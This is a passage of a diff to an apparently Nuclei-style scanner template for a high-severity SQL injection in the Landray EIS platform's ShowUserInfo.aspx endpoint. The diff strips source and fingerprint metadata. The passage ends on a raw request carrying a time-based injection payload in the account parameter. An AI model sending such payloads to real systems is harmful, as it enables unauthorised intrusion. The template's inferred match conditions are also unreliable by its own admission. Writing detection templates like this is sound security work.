@@ -3,14 +3,8 @@ info:
   name: 蓝凌EIS智慧协同平台ShowUserInfo接口SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/0df2c13fd6db64f9a388bbdc0a044e24
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 0df2c13fd6db64f9a388bbdc0a044e24
-    fofa: + hunter`web.icon=="585275a4cc54b8414554d03e1359a101"`
 http:
 - raw:
   - 'GET /third/DingTalk/Demo/ShowUserInfo.aspx?account=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
